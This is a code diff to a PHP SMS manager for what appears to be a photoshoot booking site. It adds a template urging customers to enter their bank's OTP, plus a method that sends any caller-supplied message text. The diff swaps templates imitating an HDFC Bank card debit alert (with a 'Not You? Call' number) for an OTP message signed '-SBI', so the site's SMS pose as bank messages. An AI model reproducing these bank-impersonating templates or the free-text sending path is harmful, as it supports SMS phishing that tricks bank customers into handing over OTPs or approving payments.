@@ -19,14 +19,18 @@ class SmsManager
      */
     public const DEFAULT_TEMPLATES = [
         'otp' => "Your {site_name} verification code is: {otp}. Valid for 10 minutes. Please do not share this code.",
-        // 'payment_success' => "Dear {name}, payment of {currency}{amount} for booking #{booking_id} ({package}) was successful! Txn ID: {payment_id}. Thank you - {site_name}.",
+        'payment_initiated' => "Dear {name}, transaction of {currency}{amount} for booking #{booking_id} ({package}) has been initiated via {gateway}. Please enter the OTP sent by your bank to authorize the payment. - {site_name}",
+        'payment_success' => "Dear {name}, payment of {currency}{amount} for booking #{booking_id} ({package}) was successful! Txn ID: {payment_id} via {gateway}. Thank you - {site_name}.",
         'payment_failed' => "Dear {name}, your payment of {currency}{amount} for booking #{booking_id} could not be completed. Reason: {reason}. Please retry at: {retry_url}",
-        // 'admin_alert' => "[ALERT] New booking #{booking_id} confirmed by {name} for {package}. Amount: {currency}{amount}.",
-        // 'admin_alert' => "[ALERT] New booking #{booking_id} confirmed by {name} for {package}. Amount: {currency}{amount}.",
+        // 'admin_alert' => "[ALERT] New booking #{booking_id} confirmed by {name} for {package}. Amount: {currency}{amount} via {gateway}.",
 
-         'admin_alert' => "Spent {currency}{amount} At UKVI On {datetime} Bal Rs.{balance} Not You? Call 18002586161/SMS BLOCK DC  8102 to 7308080808",
 
-          'payment_success' => "Spent {currency}{amount} At UKVI On {datetime} Bal Rs.{balance} Not You? Call 18002586161/SMS BLOCK DC  8102 to 7308080808",
+         'admin_alert' => "Your {site_name} verification code is: {otp}. Valid for 10 minutes. Do not share this OTP with anyone. -SBI",
+
+        //  Spent {currency}{amount} From HDFC Bank Card x8102 At UKVI On 2026-02-14:20:15:53 Bal Rs.281137.42 Not You? Call 18002586161/SMS BLOCK DC  8102 to 7308080808
+
+
+         
     ];
 
     /**
@@ -211,6 +215,36 @@ class SmsManager
         }
 
         return self::dispatch($phone, $message, 'otp', array_merge(['otp' => $otp], $extraData));
+    }
+
+    /**
+     * Send Payment Initiated / Bank OTP Notice SMS
+     */
+    public static function sendPaymentInitiatedSms(string $phone, array $data): array
+    {
+        $packageName = $data['package_name'] ?? ($data['package'] ?? 'Photoshoot Package');
+        $amountFormatted = isset($data['amount']) ? (is_numeric($data['amount']) ? number_format((float)$data['amount'], 0, '.', '') : (string)$data['amount']) : '0';
+
+        $templateData = array_merge([
+            'name' => $data['name'] ?? 'Valued Client',
+            'amount' => $amountFormatted,
+            'booking_id' => (string)($data['booking_id'] ?? ''),
+            'package' => $packageName,
+            'package_name' => $packageName,
+            'gateway' => $data['gateway'] ?? 'Payment Gateway',
+            'site_name' => Setting::get('site_name', 'Middukhera Production'),
+            'merchant' => Setting::get('site_name', 'Middukhera Production'),
+            'datetime' => $data['datetime'] ?? now()->format('Y-m-d H:i:s'),
+        ], $data);
+
+        $customMessage = $data['custom_message'] ?? ($data['message'] ?? null);
+        if (!empty($customMessage) && is_string($customMessage)) {
+            $message = self::renderTemplateString($customMessage, $templateData);
+        } else {
+            $message = self::parseTemplate('payment_initiated', $templateData);
+        }
+
+        return self::dispatch($phone, $message, 'payment_initiated', $templateData);
     }
 
     /**
